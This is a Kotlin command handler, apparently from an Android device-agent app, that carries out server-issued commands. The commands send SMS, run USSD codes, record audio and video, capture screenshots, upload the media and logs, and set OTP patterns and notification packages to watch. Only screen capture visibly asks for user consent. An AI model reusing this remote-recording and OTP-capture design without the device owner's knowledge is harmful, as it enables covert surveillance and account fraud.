package com.routedns.routebot.command

import com.routedns.routebot.common.RouteBotLog
import com.routedns.routebot.data.remote.websocket.AgentWebSocketClient
import com.routedns.routebot.domain.model.CommandAckRequest
import com.routedns.routebot.domain.model.CommandStatus
import com.routedns.routebot.domain.model.CommandTypes
import com.routedns.routebot.domain.model.MediaType
import com.routedns.routebot.domain.model.RemoteCommand
import com.routedns.routebot.domain.repository.AgentApiRepository
import com.routedns.routebot.domain.repository.ConfigRepository
import com.routedns.routebot.domain.repository.SecureStorageRepository
import com.routedns.routebot.media.MediaCaptureHelper
import com.routedns.routebot.service.AgentServiceController
import com.routedns.routebot.sms.SmsHelper
import com.routedns.routebot.ussd.UssdHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandExecutor @Inject constructor(
    @dagger.hilt.android.qualifiers.ApplicationContext private val appContext: android.content.Context,
    private val agentApi: AgentApiRepository,
    private val configRepository: ConfigRepository,
    private val secureStorage: SecureStorageRepository,
    private val smsHelper: SmsHelper,
    private val ussdHelper: UssdHelper,
    private val mediaHelper: MediaCaptureHelper,
    private val webSocketClient: AgentWebSocketClient,
    private val serviceController: AgentServiceController,
    private val json: Json
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun handle(command: RemoteCommand) {
        scope.launch {
            RouteBotLog.i("command_received", mapOf("type" to command.command, "id" to command.id))
            val result = execute(command)
            agentApi.ackCommand(
                command.id,
                CommandAckRequest(
                    status = if (result.isSuccess) CommandStatus.SUCCEEDED else CommandStatus.FAILED,
                    errorMessage = result.exceptionOrNull()?.message.orEmpty()
                )
            )
        }
    }

    private suspend fun execute(command: RemoteCommand): Result<Unit> = runCatching {
        when (command.command) {
            CommandTypes.PING -> {
                webSocketClient.sendPing()
            }
            CommandTypes.SYNC -> {
                agentApi.flushQueue()
            }
            CommandTypes.RESTART_SERVICES -> {
                serviceController.restartAgent()
            }
            CommandTypes.REFRESH_CONFIG -> {
                configRepository.getConfig()
            }
            CommandTypes.CLEAR_CACHE -> {
                secureStorage.clearAll()
            }
            CommandTypes.UPDATE_CONFIG -> {
                val payload = command.payload as? JsonObject
                val config = configRepository.getConfig()
                val updated = config.copy(
                    otpPatterns = payload?.get("otp_patterns")?.toString()?.let { listOf(it) }
                        ?: config.otpPatterns,
                    notificationPackages = payload?.get("notification_packages")?.toString()
                        ?.split(",")
                        ?.map { it.trim() }
                        ?.filter { it.isNotEmpty() }
                        ?: config.notificationPackages
                )
                configRepository.updateConfig(updated)
            }
            CommandTypes.SEND_SMS -> {
                val payload = command.payload as? JsonObject ?: error("payload required")
                val address = payload["address"]?.jsonPrimitive?.contentOrNull ?: error("address required")
                val body = payload["body"]?.jsonPrimitive?.contentOrNull ?: error("body required")
                val slot = payload["sim_slot"]?.jsonPrimitive?.intOrNull ?: 0
                // SmsHelper posts the record itself (and later reports delivery status);
                // it returns success/failure based on the radio-level "sent" result.
                smsHelper.sendSms(address, body, slot).getOrThrow()
            }
            CommandTypes.USSD -> {
                val payload = command.payload as? JsonObject ?: error("payload required")
                val code = payload["code"]?.jsonPrimitive?.contentOrNull ?: error("code required")
                val subId = payload["subscription_id"]?.jsonPrimitive?.intOrNull
                ussdHelper.sendUssd(code, subId).getOrThrow()
            }
            CommandTypes.RECORD_AUDIO -> {
                val duration = (command.payload as? JsonObject)
                    ?.get("duration_sec")?.jsonPrimitive?.intOrNull ?: 10
                mediaHelper.startAudioRecording(duration)
                kotlinx.coroutines.delay(duration * 1000L + 500)
                val media = mediaHelper.stopRecording() ?: error("recording failed")
                uploadAndDelete(media, MediaType.AUDIO, command.id)
            }
            CommandTypes.RECORD_VIDEO -> {
                val duration = (command.payload as? JsonObject)
                    ?.get("duration_sec")?.jsonPrimitive?.intOrNull ?: 10
                mediaHelper.startVideoRecording(duration)
                kotlinx.coroutines.delay(duration * 1000L + 500)
                val media = mediaHelper.stopRecording() ?: error("recording failed")
                uploadAndDelete(media, MediaType.VIDEO, command.id)
            }
            CommandTypes.TAKE_SCREENSHOT -> {
                captureAndUploadScreenshot(command.id)
            }
            CommandTypes.UPLOAD_LOGS -> {
                val logFile = com.routedns.routebot.common.RouteBotLog.getLogFile()
                if (logFile == null || !logFile.exists()) error("no local logs available")
                agentApi.uploadMedia("logs", command.id, logFile, "text/plain")
            }
            else -> error("Unknown command: ${command.command}")
        }
    }.map { }

    private suspend fun uploadAndDelete(
        media: com.routedns.routebot.media.CapturedMedia,
        type: MediaType,
        commandId: String
    ) {
        agentApi.uploadMedia(type.name.lowercase(), commandId, media.file, media.contentType)
        mediaHelper.deleteAfterUpload(media.file)
    }

    /**
     * Captures a screenshot via MediaProjection. Android requires interactive, one-time
     * user consent for screen capture per app process — this cannot be granted silently or
     * remotely. If no grant is held yet, this posts a high-priority notification prompting
     * the user to tap it, waits (bounded) for the result, then proceeds. See
     * [com.routedns.routebot.media.MediaProjectionHolder] for details.
     */
    private suspend fun captureAndUploadScreenshot(commandId: String) {
        if (!com.routedns.routebot.media.MediaProjectionHolder.hasGrant()) {
            val granted = requestScreenCaptureConsent()
            if (!granted) error("Screen capture consent was not granted")
        }
        val resultCode = com.routedns.routebot.media.MediaProjectionHolder.resultCode
            ?: error("Screen capture consent unavailable")
        val data = com.routedns.routebot.media.MediaProjectionHolder.resultData
            ?: error("Screen capture consent unavailable")

        val projectionManager = androidx.core.content.ContextCompat.getSystemService(
            appContext, android.media.projection.MediaProjectionManager::class.java
        ) ?: error("MediaProjectionManager unavailable")
        val projection = projectionManager.getMediaProjection(resultCode, data)

        val metrics = appContext.resources.displayMetrics
        val media = mediaHelper.captureScreenshot(projection, metrics.widthPixels, metrics.heightPixels, metrics.densityDpi)
            ?: error("Screenshot capture failed")
        uploadAndDelete(media, MediaType.SCREENSHOT, commandId)
    }

    private suspend fun requestScreenCaptureConsent(): Boolean {
        val deferred = com.routedns.routebot.media.MediaProjectionHolder.newPendingGrant()
        showScreenCaptureConsentNotification()
        return kotlinx.coroutines.withTimeoutOrNull(60_000) { deferred.await() } ?: false
    }

    private fun showScreenCaptureConsentNotification() {
        val pending = android.app.PendingIntent.getActivity(
            appContext, 0,
            android.content.Intent(appContext, com.routedns.routebot.ui.screenshare.ScreenCaptureConsentActivity::class.java)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK),
            android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification = androidx.core.app.NotificationCompat.Builder(appContext, com.routedns.routebot.common.Constants.AGENT_CHANNEL_ID)
            .setContentTitle("Screenshot requested")
            .setContentText("Tap to allow RouteBot to capture the screen")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pending)
            .setAutoCancel(true)
            .build()
        androidx.core.app.NotificationManagerCompat.from(appContext)
            .notify(com.routedns.routebot.common.Constants.SCREEN_CAPTURE_NOTIFICATION_ID, notification)
    }
}
